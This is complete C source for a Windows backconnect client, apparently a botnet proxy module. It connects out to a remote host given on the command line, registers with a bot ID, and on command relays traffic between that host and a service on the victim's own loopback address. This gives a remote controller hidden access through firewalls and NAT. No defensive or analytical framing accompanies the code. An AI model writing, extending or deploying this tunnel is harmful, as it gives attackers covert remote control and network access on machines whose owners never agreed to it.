#define _WIN32_WINNT 0x0501
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>


struct BC_INFO
{
    char *lpAddr;
    WORD wBCPort;
    char *lpID;
    WORD wPort;
};

#define COMMAND_UNKNOWN 0
#define COMMAND_BOTID 1
#define COMMAND_CONNECT 2
#define COMMAND_IS_SERVICE 3

#pragma pack(push, 1)
typedef struct
{
    WORD structSize;
    WORD dataSize;
    BYTE command;
} COMMAND;
#pragma pack(pop)

#define KEEPALIVE_DELAY    5*1000*60
#define KEEPALIVE_INTERVAL 5*1000

struct tcpKeepAlive
{
  u_long  onoff;
  u_long  keepalivetime;
  u_long  keepaliveinterval;
};

#define SIO_KEEPALIVE_VALS _WSAIOW(IOC_VENDOR,4)

#define READ_TIMEOUT 30*60*1000

#define malloc(size) (size ? (HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)(size))) : 0)
#define mfree(mem) (mem ? (HeapValidate(GetProcessHeap(), 0, mem) ? (HeapFree(GetProcessHeap(), 0, (void *)(mem)), mem = 0) : 0) : 0)

struct BCTUNNEL_INFO
{
    sockaddr_in *lpServer;
    DWORD dwID;
    WORD wPort;
};

void CloseSocket(SOCKET s);
bool TcpSetKeepAlive(SOCKET hSock,bool bEnable,DWORD dwTime,DWORD dwInterval);
int Recv(SOCKET hSock,char *lpData,int dwLen,int dwTimeout=READ_TIMEOUT);
bool RecvAll(SOCKET hSock,char *lpData,int dwLen,int dwTimeout=READ_TIMEOUT);
bool Send(SOCKET hSock,char *lpData,int dwLen);



int Recv(SOCKET hSock,char *lpData,int dwLen,int dwTimeout)
{
    if (dwTimeout > 0)
    {
        timeval tv;

        if (dwTimeout != INFINITE)
        {
            tv.tv_sec=dwTimeout/1000;
            tv.tv_usec=(dwTimeout%1000)*1000;
        }

        fd_set fdsr;
        fdsr.fd_count=1;
        fdsr.fd_array[0]=hSock;

        if (select(0,&fdsr,NULL,NULL,((dwTimeout == INFINITE) ? NULL:&tv)) != 1)
            return SOCKET_ERROR;
    }
    return recv(hSock,lpData,dwLen,0);
}

bool RecvAll(SOCKET hSock,char *lpData,int dwLen,int dwTimeout)
{
    do
    {
        int dwCurLen;
        if ((dwCurLen=Recv(hSock,lpData,dwLen,dwTimeout)) <= 0)
            return false;

        lpData=lpData+dwCurLen;
        dwLen-=dwCurLen;
    }
    while (dwLen);

    return (dwLen == 0);
}

bool Send(SOCKET hSock,char *lpData,int dwLen)
{
    return (send(hSock,lpData, dwLen, 0) == dwLen) ? true:false;
}

void CloseSocket(SOCKET s)
{
    shutdown(s,SD_BOTH);
    closesocket(s);
    return;
}

bool BC_ReadCommand(SOCKET hSock,COMMAND *lpCmd,LPBYTE *lpData)
{
    WORD wSize[2];

    if ((!RecvAll(hSock,(char*)wSize,sizeof(wSize))) || (wSize[0] <= sizeof(wSize)))
        return false;

    LPBYTE lpBuf=(LPBYTE)malloc(wSize[0]-sizeof(wSize)+wSize[1]);
    if (!lpBuf)
    {
        RecvAll(hSock,(char*)lpBuf,wSize[0]-sizeof(wSize)+wSize[1]);
        return false;
    }

    if (!RecvAll(hSock,(char*)lpBuf,wSize[0]-sizeof(wSize)))
    {
        mfree(lpBuf);
        return false;
    }

    lpCmd->structSize=sizeof(COMMAND);
    lpCmd->dataSize=wSize[1];
    lpCmd->command=lpBuf[0];

    mfree(lpBuf);

    if (!wSize[1])
    {
        if (lpData)
            *lpData = NULL;
    }
    else
    {
        if ((!lpData) || (!(lpBuf=(LPBYTE)malloc(wSize[1]))))
        {
            BYTE b;
            bool bOk=true;
            while (wSize[1]--)
            {
                if (!RecvAll(hSock,(char*)&b,sizeof(b)))
                {
                    bOk=false;
                    break;
                }
            }
            return ((lpData == NULL) ? bOk:false);
        }

        if (!RecvAll(hSock,(char*)lpBuf,wSize[1]))
        {
            mfree(lpBuf);
            return false;
        }
        *lpData=lpBuf;
    }

    return true;
}

bool BC_WriteCommand(SOCKET hSock,byte bCmd,void *lpData,WORD wSize)
{
    COMMAND bcc;
    bcc.structSize=sizeof(COMMAND);
    bcc.dataSize=wSize;
    bcc.command=bCmd;

    return ((Send(hSock,(char*)&bcc,sizeof(COMMAND))) && ((!wSize) || (Send(hSock,(char*)lpData,wSize))));
}

bool TcpSetKeepAlive(SOCKET hSock,bool bEnable,DWORD dwTime,DWORD dwInterval)
{
  tcpKeepAlive ka;
  ka.onoff=bEnable;
  ka.keepalivetime=dwTime;
  ka.keepaliveinterval=dwInterval;

  DWORD retBytes;
  return (WSAIoctl(hSock,SIO_KEEPALIVE_VALS,&ka,sizeof(tcpKeepAlive),NULL,0,&retBytes,NULL,NULL) == 0);
}

void WINAPI BC_Tunnel(BCTUNNEL_INFO *lpBCTInfo)
{
    SOCKET hLocalSock=socket(AF_INET,SOCK_STREAM,0);
    sockaddr_in dst;
    dst.sin_family=AF_INET;
    dst.sin_port=lpBCTInfo->wPort;
    dst.sin_addr.S_un.S_addr=0x0100007F;
    connect(hLocalSock,(sockaddr *)&dst,sizeof(dst));
    bool bStat=true;
    setsockopt(hLocalSock,IPPROTO_TCP,TCP_NODELAY,(char *)&bStat,sizeof(bool));


    SOCKET hRemoteSock=socket(AF_INET,SOCK_STREAM,0);
    connect(hRemoteSock,(sockaddr *)lpBCTInfo->lpServer,sizeof(sockaddr_in));
    TcpSetKeepAlive(hRemoteSock,true,KEEPALIVE_DELAY,KEEPALIVE_INTERVAL);
    setsockopt(hRemoteSock,IPPROTO_TCP,TCP_NODELAY,(char *)&bStat,sizeof(bool));
    BC_WriteCommand(hRemoteSock,COMMAND_IS_SERVICE,(LPBYTE)&lpBCTInfo->dwID,sizeof(DWORD));


    while (true)
    {
        fd_set fdsr;
        fdsr.fd_count=2;
        fdsr.fd_array[0]=hRemoteSock;
        fdsr.fd_array[1]=hLocalSock;

        if (select(0,&fdsr,NULL,NULL,NULL) < 1)
            break;

        for (u_int i=0; i < fdsr.fd_count; i++)
        {
            char buf[1024];
            int dw;
            SOCKET hRead=fdsr.fd_array[i],
                   hWrite=((hRead == hLocalSock) ? hRemoteSock:hLocalSock);
            if (((dw=Recv(hRead,buf,sizeof(buf))) < 1) || (!Send(hWrite,buf,dw)))
                goto end;
        }
    }
end:CloseSocket(hLocalSock);
    CloseSocket(hRemoteSock);
    mfree(lpBCTInfo);
    return;
}

void BC_Connections(BC_INFO *lpInfo)
{
    SOCKET hRemoteSock=socket(AF_INET,SOCK_STREAM,0);
    sockaddr_in dst;
    dst.sin_family=AF_INET;
    dst.sin_port=lpInfo->wBCPort;

    if ((dst.sin_addr.s_addr=inet_addr(lpInfo->lpAddr)) == INADDR_NONE)
    {
        HOSTENT *hst;
        if (hst=gethostbyname(lpInfo->lpAddr))
            ((unsigned long *)&dst.sin_addr)[0]=((unsigned long **)hst->h_addr_list)[0][0];
        else
        {
            CloseSocket(hRemoteSock);
            return;
        }
    }

    if (connect(hRemoteSock,(sockaddr *)&dst,sizeof(dst)))
    {
        CloseSocket(hRemoteSock);
        return;
    }

    bool bStat=true;
    setsockopt(hRemoteSock,IPPROTO_TCP,TCP_NODELAY,(char *)&bStat,sizeof(bool));
    TcpSetKeepAlive(hRemoteSock,true,KEEPALIVE_DELAY,KEEPALIVE_INTERVAL);
    if (BC_WriteCommand(hRemoteSock,COMMAND_BOTID,lpInfo->lpID,lstrlenA(lpInfo->lpID)))
    {
        COMMAND bcc;
        LPBYTE bccData;

        while (BC_ReadCommand(hRemoteSock,&bcc,&bccData))
        {
            if ((bcc.command == COMMAND_CONNECT) && (bcc.dataSize == sizeof(DWORD)))
            {
                BCTUNNEL_INFO *lpBCTInfo=(BCTUNNEL_INFO *)malloc(sizeof(BCTUNNEL_INFO));
                if (lpBCTInfo)
                {
                    lpBCTInfo->lpServer=&dst;
                    lpBCTInfo->dwID=*(LPDWORD)bccData;
                    lpBCTInfo->wPort=lpInfo->wPort;
                    CloseHandle(CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)BC_Tunnel,(LPVOID)lpBCTInfo,0,NULL));
                }
            }
            mfree(bccData);
        }
    }
    return;
}

void main(int argc, char* argv[])
{
    if (argc < 4)
        printf(TEXT("usage: port bchost bcport"));
    else
    {
        WSADATA wsa;
        WSAStartup(0x0202,&wsa);
        BC_INFO *lpInfo=(BC_INFO*)malloc(sizeof(BC_INFO));
        lpInfo->lpAddr=argv[2];
        lpInfo->lpID=(char*)malloc(9);
        _itoa_s(GetTickCount(),lpInfo->lpID,8,16);
        lpInfo->wBCPort=htons(atoi(argv[3]));
        lpInfo->wPort=htons(atoi(argv[1]));
        BC_Connections(lpInfo);
    }

    ExitProcess(0);
}
